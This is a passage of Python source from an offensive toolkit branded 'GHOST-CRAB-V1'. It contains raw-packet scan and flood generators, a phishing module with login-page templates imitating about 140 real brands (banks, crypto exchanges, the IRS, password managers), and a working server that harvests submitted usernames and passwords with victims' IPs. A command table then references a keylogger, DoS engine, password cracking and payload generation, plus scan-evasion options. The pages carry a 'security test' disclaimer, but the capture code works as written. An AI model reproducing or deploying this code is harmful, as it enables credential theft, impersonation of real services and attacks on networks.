            conn.request("GET", "/", headers={"User-Agent": "GHOST-CRAB-V1"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        """DNS query"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        """ARP request"""
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        """Mixed traffic"""
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        """Random traffic"""
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _xmas(self, target: str, port: int) -> int:
        """XMAS scan"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="FPU")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _null(self, target: str, port: int) -> int:
        """NULL scan"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _fin_scan(self, target: str, port: int) -> int:
        """FIN scan"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="F")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _get_local_mac(self) -> str:
        """Get local MAC address"""
        try:
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        """Stop traffic generation"""
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        """Get active generators"""
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# SOCIAL ENGINEERING TOOLS (100+ Templates)
# =====================
class SocialEngineeringTools:
    """Social engineering and phishing tools with 100+ templates"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = None
        self.active_links = {}
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        """Load all phishing templates"""
        return {
            # Social Media (25)
            'facebook': self._get_template("Facebook", "#1877f2", "Facebook"),
            'instagram': self._get_template("Instagram", "#0095f6", "Instagram"),
            'twitter': self._get_template("Twitter", "#1d9bf0", "X / Twitter"),
            'linkedin': self._get_template("LinkedIn", "#0a66c2", "LinkedIn"),
            'snapchat': self._get_template("Snapchat", "#fffc00", "Snapchat"),
            'tiktok': self._get_template("TikTok", "#fe2c55", "TikTok"),
            'reddit': self._get_template("Reddit", "#ff4500", "Reddit"),
            'pinterest': self._get_template("Pinterest", "#e60023", "Pinterest"),
            'tumblr': self._get_template("Tumblr", "#36465d", "Tumblr"),
            'flickr': self._get_template("Flickr", "#ff0084", "Flickr"),
            'quora': self._get_template("Quora", "#b92b27", "Quora"),
            'medium': self._get_template("Medium", "#000000", "Medium"),
            'youtube': self._get_template("YouTube", "#ff0000", "YouTube"),
            'twitch': self._get_template("Twitch", "#9146ff", "Twitch"),
            'discord': self._get_template("Discord", "#5865f2", "Discord"),
            'telegram': self._get_template("Telegram", "#2aabee", "Telegram"),
            'whatsapp': self._get_template("WhatsApp", "#25d366", "WhatsApp"),
            'wechat': self._get_template("WeChat", "#07c160", "WeChat"),
            'line': self._get_template("LINE", "#00c300", "LINE"),
            'viber': self._get_template("Viber", "#7360f2", "Viber"),
            'mastodon': self._get_template("Mastodon", "#6364ff", "Mastodon"),
            'threads': self._get_template("Threads", "#000000", "Threads"),
            'clubhouse': self._get_template("Clubhouse", "#f0e5d8", "Clubhouse"),
            'nextdoor': self._get_template("Nextdoor", "#8ed500", "Nextdoor"),
            'meetup': self._get_template("Meetup", "#f13a59", "Meetup"),
            
            # Email Providers (15)
            'gmail': self._get_template("Gmail", "#1a73e8", "Gmail"),
            'yahoo': self._get_template("Yahoo", "#410093", "Yahoo"),
            'outlook': self._get_template("Outlook", "#0078d4", "Outlook"),
            'protonmail': self._get_template("ProtonMail", "#505061", "ProtonMail"),
            'zoho': self._get_template("Zoho", "#e42527", "Zoho Mail"),
            'icloud': self._get_template("iCloud", "#0071e3", "iCloud"),
            'aol': self._get_template("AOL", "#ff0b00", "AOL"),
            'gmx': self._get_template("GMX", "#1c449b", "GMX"),
            'mailcom': self._get_template("Mail.com", "#0066cc", "Mail.com"),
            'yandex': self._get_template("Yandex", "#ff0000", "Yandex"),
            'fastmail': self._get_template("FastMail", "#0067c5", "FastMail"),
            'tutanota': self._get_template("Tutanota", "#840010", "Tutanota"),
            'mailfence': self._get_template("Mailfence", "#00a4e4", "Mailfence"),
            'posteo': self._get_template("Posteo", "#00954c", "Posteo"),
            'hushmail': self._get_template("Hushmail", "#0066cc", "Hushmail"),
            
            # Tech Companies (15)
            'microsoft': self._get_template("Microsoft", "#0078d4", "Microsoft"),
            'google': self._get_template("Google", "#4285f4", "Google"),
            'apple': self._get_template("Apple", "#0071e3", "Apple"),
            'amazon': self._get_template("Amazon", "#ff9900", "Amazon"),
            'github': self._get_template("GitHub", "#24292f", "GitHub"),
            'gitlab': self._get_template("GitLab", "#fc6d26", "GitLab"),
            'bitbucket': self._get_template("Bitbucket", "#0052cc", "Bitbucket"),
            'adobe': self._get_template("Adobe", "#ff0000", "Adobe"),
            'dropbox': self._get_template("Dropbox", "#0061ff", "Dropbox"),
            'slack': self._get_template("Slack", "#611f69", "Slack"),
            'zoom': self._get_template("Zoom", "#2d8cff", "Zoom"),
            'teams': self._get_template("Teams", "#5059e8", "Teams"),
            'onedrive': self._get_template("OneDrive", "#0078d4", "OneDrive"),
            'office365': self._get_template("Office 365", "#0078d4", "Office 365"),
            'salesforce': self._get_template("Salesforce", "#00a1e0", "Salesforce"),
            
            # Finance (20)
            'paypal': self._get_template("PayPal", "#0070ba", "PayPal"),
            'venmo': self._get_template("Venmo", "#008cff", "Venmo"),
            'cashapp': self._get_template("Cash App", "#00d632", "Cash App"),
            'chase': self._get_template("Chase", "#1174c2", "Chase"),
            'wellsfargo': self._get_template("Wells Fargo", "#bc1f2c", "Wells Fargo"),
            'bankofamerica': self._get_template("Bank of America", "#e31837", "Bank of America"),
            'citibank': self._get_template("Citibank", "#003b70", "Citibank"),
            'capitalone': self._get_template("Capital One", "#004977", "Capital One"),
            'americanexpress': self._get_template("American Express", "#006fcf", "American Express"),
            'discover': self._get_template("Discover", "#ff6000", "Discover"),
            'barclays': self._get_template("Barclays", "#00aeef", "Barclays"),
            'hsbc': self._get_template("HSBC", "#db0011", "HSBC"),
            'revolut': self._get_template("Revolut", "#0075eb", "Revolut"),
            'monzo': self._get_template("Monzo", "#ff3464", "Monzo"),
            'stripe': self._get_template("Stripe", "#635bff", "Stripe"),
            'square': self._get_template("Square", "#000000", "Square"),
            'coinbase': self._get_template("Coinbase", "#0052ff", "Coinbase"),
            'binance': self._get_template("Binance", "#f0b90b", "Binance"),
            'kraken': self._get_template("Kraken", "#5741d9", "Kraken"),
            'metamask': self._get_template("MetaMask", "#f6851b", "MetaMask"),
            
            # Gaming (15)
            'steam': self._get_template("Steam", "#67c1f5", "Steam"),
            'epicgames': self._get_template("Epic Games", "#000000", "Epic Games"),
            'roblox': self._get_template("Roblox", "#e32c2c", "Roblox"),
            'minecraft': self._get_template("Minecraft", "#6b8c42", "Minecraft"),
            'xbox': self._get_template("Xbox", "#107c10", "Xbox"),
            'playstation': self._get_template("PlayStation", "#003791", "PlayStation"),
            'nintendo': self._get_template("Nintendo", "#e60012", "Nintendo"),
            'battlenet': self._get_template("Battle.net", "#0074e0", "Battle.net"),
            'ubisoft': self._get_template("Ubisoft", "#0070ff", "Ubisoft"),
            'ea': self._get_template("EA Games", "#ff0000", "EA Games"),
            'riot': self._get_template("Riot Games", "#d13639", "Riot Games"),
            'blizzard': self._get_template("Blizzard", "#00aeff", "Blizzard"),
            'rockstar': self._get_template("Rockstar", "#fcaf17", "Rockstar Games"),
            'gog': self._get_template("GOG", "#8b00ff", "GOG"),
            'itchio': self._get_template("itch.io", "#fa5c5c", "itch.io"),
            
            # Dating (10)
            'tinder': self._get_template("Tinder", "#ff5a60", "Tinder"),
            'bumble': self._get_template("Bumble", "#ff6b6b", "Bumble"),
            'hinge': self._get_template("Hinge", "#1a1a1a", "Hinge"),
            'okcupid': self._get_template("OkCupid", "#ff4e6b", "OkCupid"),
            'match': self._get_template("Match.com", "#ff6b6b", "Match.com"),
            'plentyoffish': self._get_template("Plenty of Fish", "#ff6b6b", "Plenty of Fish"),
            'grindr': self._get_template("Grindr", "#ffcc00", "Grindr"),
            'her': self._get_template("HER", "#ff6b6b", "HER"),
            'coffee_meets_bagel': self._get_template("Coffee Meets Bagel", "#ff6b6b", "Coffee Meets Bagel"),
            'happn': self._get_template("Happn", "#ff6b6b", "Happn"),
            
            # Streaming (10)
            'netflix': self._get_template("Netflix", "#e50914", "Netflix"),
            'spotify': self._get_template("Spotify", "#1ed760", "Spotify"),
            'hulu': self._get_template("Hulu", "#1ce783", "Hulu"),
            'disneyplus': self._get_template("Disney+", "#113ccf", "Disney+"),
            'hbomax': self._get_template("HBO Max", "#5822b4", "HBO Max"),
            'primevideo': self._get_template("Prime Video", "#00a8e1", "Prime Video"),
            'appletv': self._get_template("Apple TV+", "#000000", "Apple TV+"),
            'paramount': self._get_template("Paramount+", "#0064ff", "Paramount+"),
            'peacock': self._get_template("Peacock", "#000000", "Peacock"),
            'crunchyroll': self._get_template("Crunchyroll", "#f47521", "Crunchyroll"),
            
            # Shopping (10)
            'ebay': self._get_template("eBay", "#e53238", "eBay"),
            'walmart': self._get_template("Walmart", "#0071dc", "Walmart"),
            'target': self._get_template("Target", "#cc0000", "Target"),
            'bestbuy': self._get_template("Best Buy", "#0046be", "Best Buy"),
            'etsy': self._get_template("Etsy", "#f1641e", "Etsy"),
            'aliexpress': self._get_template("AliExpress", "#ff6a00", "AliExpress"),
            'alibaba': self._get_template("Alibaba", "#ff6a00", "Alibaba"),
            'wish': self._get_template("Wish", "#2fb7ec", "Wish"),
            'shein': self._get_template("Shein", "#000000", "Shein"),
            'temu': self._get_template("Temu", "#fb7701", "Temu"),
            
            # Cloud & Services (10)
            'aws': self._get_template("AWS", "#ff9900", "AWS"),
            'azure': self._get_template("Azure", "#0078d4", "Azure"),
            'gcp': self._get_template("Google Cloud", "#4285f4", "Google Cloud"),
            'digitalocean': self._get_template("DigitalOcean", "#0080ff", "DigitalOcean"),
            'cloudflare': self._get_template("Cloudflare", "#f38020", "Cloudflare"),
            'namecheap': self._get_template("Namecheap", "#de3723", "Namecheap"),
            'godaddy': self._get_template("GoDaddy", "#00a4a6", "GoDaddy"),
            'heroku': self._get_template("Heroku", "#430098", "Heroku"),
            'vercel': self._get_template("Vercel", "#000000", "Vercel"),
            'netlify': self._get_template("Netlify", "#00c7b7", "Netlify"),
            
            # Education (5)
            'coursera': self._get_template("Coursera", "#0056d2", "Coursera"),
            'udemy': self._get_template("Udemy", "#a435f0", "Udemy"),
            'edx': self._get_template("edX", "#02262b", "edX"),
            'khanacademy': self._get_template("Khan Academy", "#14bf96", "Khan Academy"),
            'duolingo': self._get_template("Duolingo", "#58cc71", "Duolingo"),
            
            # Government (5)
            'irs': self._get_template("IRS", "#003366", "IRS"),
            'dmv': self._get_template("DMV", "#003366", "DMV"),
            'usps': self._get_template("USPS", "#333366", "USPS"),
            'fedex': self._get_template("FedEx", "#4d148c", "FedEx"),
            'ups': self._get_template("UPS", "#351c15", "UPS"),
            
            # VPN & Security (5)
            'nordvpn': self._get_template("NordVPN", "#4687ff", "NordVPN"),
            'expressvpn': self._get_template("ExpressVPN", "#da3940", "ExpressVPN"),
            'surfshark': self._get_template("Surfshark", "#1ebfbf", "Surfshark"),
            'lastpass': self._get_template("LastPass", "#d32d27", "LastPass"),
            '1password': self._get_template("1Password", "#0572ec", "1Password"),
            
            # Custom
            'custom': self._custom_template()
        }
    
    def _get_template(self, name: str, color: str, display_name: str) -> str:
        """Generate a phishing template"""
        return f'''<!DOCTYPE html>
<html><head><title>{display_name}</title>
<style>
body{{font-family:'Courier New',monospace;background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.login-box{{background:#1a1a1a;border:2px solid #ff0000;border-radius:8px;padding:40px;width:400px;box-shadow:0 0 30px rgba(255,0,0,0.3)}}
.logo{{color:#ff0000;font-size:32px;text-align:center;margin-bottom:30px;letter-spacing:4px;text-transform:uppercase;font-weight:bold}}
input{{width:100%;padding:14px;margin:10px 0;background:#0a0a0a;border:2px solid #333;border-radius:6px;box-sizing:border-box;color:#fff;font-family:'Courier New',monospace}}
input:focus{{outline:none;border-color:#ff0000;box-shadow:0 0 15px rgba(255,0,0,0.5)}}
button{{width:100%;padding:14px;background:#ff0000;color:#fff;border:none;border-radius:6px;font-size:20px;cursor:pointer;font-weight:bold;font-family:'Courier New',monospace;letter-spacing:2px;transition:all 0.3s}}
button:hover{{background:#cc0000;box-shadow:0 0 20px rgba(255,0,0,0.6)}}
.warning{{margin-top:20px;padding:10px;background:rgba(255,0,0,0.1);color:#ff6b6b;text-align:center;border-radius:4px;font-size:12px;border:1px solid rgba(255,0,0,0.3)}}
</style>
</head>
<body>
<div class="login-box"><div class="logo">{display_name}</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">LOGIN</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _custom_template(self) -> str:
        """Generate custom template"""
        return '''<!DOCTYPE html>
<html><head><title>Secure Login</title>
<style>
body{font-family:'Courier New',monospace;background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:#1a1a1a;border:2px solid #ff0000;border-radius:8px;padding:40px;width:400px;box-shadow:0 0 30px rgba(255,0,0,0.3)}
.logo{text-align:center;margin-bottom:30px;color:#ff0000;font-size:28px;font-weight:bold;letter-spacing:6px;text-transform:uppercase}
input{width:100%;padding:14px;margin:10px 0;background:#0a0a0a;border:2px solid #333;border-radius:6px;color:#fff;box-sizing:border-box;font-family:'Courier New',monospace}
input:focus{outline:none;border-color:#ff0000;box-shadow:0 0 15px rgba(255,0,0,0.5)}
button{width:100%;padding:14px;background:#ff0000;color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:bold;font-size:16px;font-family:'Courier New',monospace;letter-spacing:2px}
button:hover{background:#cc0000;box-shadow:0 0 20px rgba(255,0,0,0.6)}
.warning{margin-top:20px;padding:10px;background:rgba(255,0,0,0.1);border:1px solid rgba(255,0,0,0.3);color:#ff6b6b;text-align:center;font-size:12px;border-radius:4px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">GHOST-CRAB-V1</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">SECURE LOGIN</button></form>
<div class="warning">🔒 Secure connection - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def generate_phishing_link(self, platform: str) -> Dict:
        """Generate a phishing link"""
        link_id = str(uuid.uuid4())[:8]
        template_func = self.templates.get(platform, self._custom_template)
        html = template_func() if callable(template_func) else template_func
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        """Start phishing server"""
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        
        class PhishingHandler(BaseHTTPRequestHandler):
            server_instance = None
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                if self.server_instance and self.server_instance.html:
                    self.wfile.write(self.server_instance.html.encode())
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode()
                form_data = urllib.parse.parse_qs(post_data)
                
                username = form_data.get('email', form_data.get('username', ['']))[0]
                password = form_data.get('password', [''])[0]
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                if self.server_instance and self.server_instance.db and username and password:
                    self.server_instance.db.save_captured_credential(
                        self.server_instance.link_id, username, password, client_ip, user_agent
                    )
                    print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                    print(f"  IP: {client_ip}")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
        
        server = HTTPServer(('0.0.0.0', port), PhishingHandler)
        server.server_instance = self
        server.link_id = link_id
        server.html = link_data['html']
        
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.phishing_server = server
        
        return True
    
    def stop_server(self):
        """Stop phishing server"""
        if self.phishing_server:
            self.phishing_server.shutdown()
            self.phishing_server = None
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        return self.db.get_captured_credentials(link_id)
    
    def create_custom_template(self, name: str, platform: str, html_content: str) -> Dict:
        """Create a custom phishing template"""
        template_id = str(uuid.uuid4())[:8]
        self.db.save_custom_template(template_id, name, platform, html_content)
        self.templates[platform] = html_content
        return {'success': True, 'template_id': template_id, 'name': name}
    
    def get_available_templates(self) -> List[str]:
        """Get all available templates"""
        return list(self.templates.keys())

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Main command handler with 500+ commands"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.tools = NetworkTools()
        self.social = SocialEngineeringTools(db)
        self.traffic = TrafficGeneratorEngine(db) if SCAPY_AVAILABLE else None
        self.dos_engine = None  # Will be initialized by main app
        self.keylogger = None  # Will be initialized by main app
        self.ssh = None  # Will be initialized by main app
        self.cracking = None  # Will be initialized by main app
        self.docker = None  # Will be initialized by main app
        self.re_tools = ReverseEngineeringTools(db, config)
        self.report_gen = ReportGenerator(db, config)
        self.image_payload_gen = ImagePayloadGenerator(db, config)
        
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        """Build command dictionary with 500+ commands"""
        commands = {
            # ==================== System Commands ====================
            'help': self._help,
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'clear': self._clear,
            'version': self._version,
            'stats': self._stats,
            
            # ==================== Ping Commands (20+) ====================
            'ping': self._ping,
            'ping6': self._ping6,
            'ping_sweep': self._ping_sweep,
            'fping': self._fping,
            'ping_flood': self._ping_flood,
            'ping_mtu': self._ping_mtu,
            'ping_size': self._ping_size,
            'ping_count': self._ping_count,
            'ping_interval': self._ping_interval,
            'ping_timeout': self._ping_timeout,
            'ping_ttl': self._ping_ttl,
            'ping_interface': self._ping_interface,
            'ping_source': self._ping_source,
            'ping_pattern': self._ping_pattern,
            'ping_record': self._ping_record,
            'ping_timestamp': self._ping_timestamp,
            'ping_quiet': self._ping_quiet,
            'ping_verbose': self._ping_verbose,
            'ping_numeric': self._ping_numeric,
            'ping_deadline': self._ping_deadline,
            'ping_adaptive': self._ping_adaptive,
            'ping_audible': self._ping_audible,
            
            # ==================== Traceroute Commands (25+) ====================
            'traceroute': self._traceroute,
            'tracert': self._traceroute,
            'tracepath': self._tracepath,
            'traceroute6': self._traceroute6,
            'traceroute_tcp': self._traceroute_tcp,
            'traceroute_udp': self._traceroute_udp,
            'traceroute_icmp': self._traceroute_icmp,
            'traceroute_max_hops': self._traceroute_max_hops,
            'traceroute_first_hop': self._traceroute_first_hop,
            'traceroute_queries': self._traceroute_queries,
            'traceroute_wait': self._traceroute_wait,
            'traceroute_port': self._traceroute_port,
            'traceroute_numeric': self._traceroute_numeric,
            'traceroute_verbose': self._traceroute_verbose,
            'traceroute_debug': self._traceroute_debug,
            'traceroute_dont_fragment': self._traceroute_dont_fragment,
            'traceroute_interface': self._traceroute_interface,
            'traceroute_source': self._traceroute_source,
            'traceroute_tos': self._traceroute_tos,
            'traceroute_as_lookup': self._traceroute_as_lookup,
            'mtr': self._mtr,
            'mtr_report': self._mtr_report,
            'mtr_json': self._mtr_json,
            'mtr_csv': self._mtr_csv,
            'mtr_xml': self._mtr_xml,
            'mtr_raw': self._mtr_raw,
            'tcptraceroute': self._tcptraceroute,
            'lft': self._lft,
            
            # ==================== Nmap Commands (60+) ====================
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os,
            'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            'nmap_ping': self._nmap_ping,
            'nmap_ports': self._nmap_ports,
            'nmap_script': self._nmap_script,
            'nmap_aggressive': self._nmap_aggressive,
            'nmap_traceroute': self._nmap_traceroute,
            'nmap_output': self._nmap_output,
            'nmap_exclude': self._nmap_exclude,
            'nmap_exclude_file': self._nmap_exclude_file,
            'nmap_input': self._nmap_input,
            'nmap_random': self._nmap_random,
            'nmap_timing': self._nmap_timing,
            'nmap_version': self._nmap_version,
            'nmap_help': self._nmap_help,
            'nmap_syn': self._nmap_syn,
            'nmap_connect': self._nmap_connect,
            'nmap_ack': self._nmap_ack,
            'nmap_fin': self._nmap_fin,
            'nmap_xmas': self._nmap_xmas,
            'nmap_null': self._nmap_null,
            'nmap_script_default': self._nmap_script_default,
            'nmap_top_ports': self._nmap_top_ports,
            'nmap_open': self._nmap_open,
            'nmap_reason': self._nmap_reason,
            'nmap_packet_trace': self._nmap_packet_trace,
            'nmap_iflist': self._nmap_iflist,
            'nmap_no_ping': self._nmap_no_ping,
            'nmap_fast': self._nmap_fast,
            'nmap_fragment': self._nmap_fragment,
            'nmap_decoys': self._nmap_decoys,
            'nmap_source_port': self._nmap_source_port,
            'nmap_data_length': self._nmap_data_length,
            'nmap_ttl': self._nmap_ttl,
            'nmap_spoof_mac': self._nmap_spoof_mac,
            'nmap_badsum': self._nmap_badsum,
            'nmap_send_eth': self._nmap_send_eth,
            'nmap_send_ip': self._nmap_send_ip,
            'nmap_privileged': self._nmap_privileged,
            'nmap_unprivileged': self._nmap_unprivileged,
            'nmap_release_memory': self._nmap_release_memory,
            'nmap_version_intensity': self._nmap_version_intensity,
            'nmap_version_light': self._nmap_version_light,
            'nmap_version_all': self._nmap_version_all,
            'nmap_osscan_limit': self._nmap_osscan_limit,
            'nmap_osscan_guess': self._nmap_osscan_guess,
            'nmap_max_os_tries': self._nmap_max_os_tries,
            'nmap_max_retries': self._nmap_max_retries,
            'nmap_host_timeout': self._nmap_host_timeout,
            'nmap_scan_delay': self._nmap_scan_delay,
            'nmap_max_scan_delay': self._nmap_max_scan_delay,
            'nmap_min_rate': self._nmap_min_rate,
            'nmap_max_rate': self._nmap_max_rate,
            'nmap_min_parallelism': self._nmap_min_parallelism,
            'nmap_max_parallelism': self._nmap_max_parallelism,
            'nmap_defeat_rst_ratelimit': self._nmap_defeat_rst_ratelimit,
            'nmap_defeat_icmp_ratelimit': self._nmap_defeat_icmp_ratelimit,
            
            # ==================== Curl Commands (60+) ====================
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_put': self._curl_put,
            'curl_delete': self._curl_delete,
            'curl_patch': self._curl_patch,
            'curl_head': self._curl_head,
            'curl_options': self._curl_options,
            'curl_output': self._curl_output,
            'curl_remote_name': self._curl_remote_name,
            'curl_location': self._curl_location,
            'curl_include': self._curl_include,
            'curl_verbose': self._curl_verbose,
            'curl_silent': self._curl_silent,
            'curl_show_error': self._curl_show_error,
            'curl_fail': self._curl_fail,
            'curl_insecure': self._curl_insecure,
            'curl_data': self._curl_data,
            'curl_data_binary': self._curl_data_binary,
            'curl_data_urlencode': self._curl_data_urlencode,
            'curl_data_raw': self._curl_data_raw,
            'curl_form': self._curl_form,
            'curl_header': self._curl_header,
            'curl_user_agent': self._curl_user_agent,
            'curl_referer': self._curl_referer,
            'curl_user': self._curl_user,
            'curl_basic': self._curl_basic,
            'curl_digest': self._curl_digest,
            'curl_ntlm': self._curl_ntlm,
            'curl_negotiate': self._curl_negotiate,
            'curl_cookie': self._curl_cookie,
            'curl_cookie_jar': self._curl_cookie_jar,
            'curl_proxy': self._curl_proxy,
            'curl_proxy_user': self._curl_proxy_user,
            'curl_noproxy': self._curl_noproxy,
            'curl_cert': self._curl_cert,
            'curl_key': self._curl_key,
            'curl_cacert': self._curl_cacert,
            'curl_capath': self._curl_capath,
            'curl_ciphers': self._curl_ciphers,
            'curl_tlsv1_2': self._curl_tlsv1_2,
            'curl_tlsv1_3': self._curl_tlsv1_3,
            'curl_continue': self._curl_continue,
            'curl_range': self._curl_range,
            'curl_limit_rate': self._curl_limit_rate,
            'curl_max_filesize': self._curl_max_filesize,
            'curl_max_time': self._curl_max_time,
            'curl_connect_timeout': self._curl_connect_timeout,
            'curl_retry': self._curl_retry,
            'curl_retry_delay': self._curl_retry_delay,
            'curl_retry_max_time': self._curl_retry_max_time,
            'curl_retry_connrefused': self._curl_retry_connrefused,
            'curl_ipv4': self._curl_ipv4,
            'curl_ipv6': self._curl_ipv6,
            'curl_interface': self._curl_interface,
            'curl_local_port': self._curl_local_port,
            'curl_dns_servers': self._curl_dns_servers,
            'curl_resolve': self._curl_resolve,
            'curl_connect_to': self._curl_connect_to,
            'curl_unix_socket': self._curl_unix_socket,
            'curl_http2': self._curl_http2,
            'curl_http3': self._curl_http3,
            'curl_compressed': self._curl_compressed,
            'curl_raw': self._curl_raw,
            'curl_write_out': self._curl_write_out,
            'curl_dump_header': self._curl_dump_header,
            'curl_trace': self._curl_trace,
            'curl_trace_ascii': self._curl_trace_ascii,
            'curl_json': self._curl_json,
            'curl_help': self._curl_help,
            'curl_version': self._curl_version,
            'curl_parallel': self._curl_parallel,
            'curl_config': self._curl_config,
            'curl_next': self._curl_next,
            'curl_styled': self._curl_styled,
            'curl_progress': self._curl_progress,
            
            # ==================== Wget Commands (50+) ====================
            'wget': self._wget,
            'wget_output': self._wget_output,
            'wget_continue': self._wget_continue,
            'wget_background': self._wget_background,
            'wget_quiet': self._wget_quiet,
            'wget_recursive': self._wget_recursive,
            'wget_mirror': self._wget_mirror,
            'wget_spider': self._wget_spider,
            'wget_input': self._wget_input,
            'wget_header': self._wget_header,
            'wget_user_agent': self._wget_user_agent,
            'wget_referer': self._wget_referer,
            'wget_cookies': self._wget_cookies,
            'wget_save_cookies': self._wget_save_cookies,
            'wget_limit_rate': self._wget_limit_rate,
            'wget_timeout': self._wget_timeout,
            'wget_tries': self._wget_tries,
            'wget_retry': self._wget_retry,
            'wget_no_check_cert': self._wget_no_check_cert,
            'wget_certificate': self._wget_certificate,
            'wget_private_key': self._wget_private_key,
            'wget_ca_certificate': self._wget_ca_certificate,
            'wget_proxy': self._wget_proxy,
            'wget_no_proxy': self._wget_no_proxy,
            'wget_user': self._wget_user,
            'wget_password': self._wget_password,
            'wget_post_data': self._wget_post_data,
            'wget_post_file': self._wget_post_file,
            'wget_method': self._wget_method,
            'wget_body_data': self._wget_body_data,
            'wget_body_file': self._wget_body_file,
            'wget_timestamping': self._wget_timestamping,
            'wget_no_clobber': self._wget_no_clobber,
            'wget_delete_after': self._wget_delete_after,
            'wget_progress': self._wget_progress,
            'wget_show_progress': self._wget_show_progress,
            'wget_config': self._wget_config,
            'wget_append_output': self._wget_append_output,
            'wget_output_file': self._wget_output_file,
            'wget_no_parent': self._wget_no_parent,
            'wget_cut_dirs': self._wget_cut_dirs,
            'wget_directory_prefix': self._wget_directory_prefix,
            'wget_convert_links': self._wget_convert_links,
            'wget_backup_converted': self._wget_backup_converted,
            'wget_adjust_extension': self._wget_adjust_extension,
            'wget_restrict_file_names': self._wget_restrict_file_names,
            'wget_trust_server_names': self._wget_trust_server_names,
            'wget_content_disposition': self._wget_content_disposition,
            'wget_random_wait': self._wget_random_wait,
            'wget_wait': self._wget_wait,
            'wget_waitretry': self._wget_waitretry,
            'wget_quota': self._wget_quota,
            'wget_dns_timeout': self._wget_dns_timeout,
            'wget_connect_timeout': self._wget_connect_timeout,
            'wget_read_timeout': self._wget_read_timeout,
            'wget_inet4': self._wget_inet4,
            'wget_inet6': self._wget_inet6,
            'wget_prefer_family': self._wget_prefer_family,
            'wget_bind_address': self._wget_bind_address,
            'wget_no_dns_cache': self._wget_no_dns_cache,
            'wget_no_http_keep_alive': self._wget_no_http_keep_alive,
            'wget_no_cache': self._wget_no_cache,
            'wget_no_cookies': self._wget_no_cookies,
            'wget_load_cookies': self._wget_load_cookies,
            'wget_keep_session_cookies': self._wget_keep_session_cookies,
            'wget_help': self._wget_help,
            'wget_version': self._wget_version,
            
